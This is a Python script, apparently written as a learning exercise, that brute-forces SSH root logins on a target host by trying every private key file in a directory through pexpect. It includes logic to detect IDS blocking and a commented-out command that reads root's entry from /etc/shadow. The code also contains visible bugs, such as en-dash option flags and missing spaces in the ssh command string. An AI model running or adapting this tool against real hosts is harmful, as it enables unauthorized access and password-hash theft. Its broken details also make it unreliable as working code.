# coding=utf-8
# Only works on Linux due to spawn command. This was written the long way round to learn the internals.
# Use built in pxssh module to interact with SSH in a much simpler format.
import argparse
import os
from threading import *

import pexpect

thread_lock = Semaphore()
PROMPT = ['# ', '>>> ', '> ', '\$ ']

stop = False
fail = 0


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, keyfile, lock_status):
    global stop, fail
    perm_denied = 'Permission denied'
    ssh_newkey = 'Are you sure you want to continue'
    pass_auth_no = '–o PasswordAuthentication=no ---'
    conn_closed = 'Connection closed by remote host'
    connStr = 'ssh ' + user + '@' + host + '–i' + keyfile + pass_auth_no
    try:
        child = pexpect.spawn(connStr)
        # Checks which index is matched by expect call return. If user has connected before, it will not prompt ssh_newkey,
        # hence returning 2 and jumping to child.sendline(password)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, perm_denied, conn_closed, '$', '#', ])
        if ret == 0:
            print('[-] Error Connecting')
            connect(user, host, keyfile, False)
        elif ret == 1:
            print('[-] Adding Host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] IDS may have blocked this connection/IP')
            fail += 1
            connect(user, host, keyfile, False)
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            stop = True
    finally:
        if lock_status:
            thread_lock.release()

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('tgtHost', type=str)
    parser.add_argument('passkey_path', type=str)

    args = parser.parse_args()
    tgt_host = args.tgtHost
    passkey_path = args.passkey_path
    if (tgt_host is None) | (passkey_path is None):
        print(parser.print_help())
        exit(0)

    for filename in os.listdir(passkey_path):
        if stop:
            print('[-] Password has been found')
            exit(0)
        if fail > 5:
            print('[-] IDS may have blocked this connection/IP. Stopping connection...')
            exit(0)
        fullpath = os.path.join(passkey_path, filename)
        thread_lock.acquire()
        t = Thread(target=connect, args=('root', tgt_host, fullpath, True))
        child = t.start()
        # send_command(child, 'cat /etc/shadow | grep root')


if __name__ == '__main__':
    main()
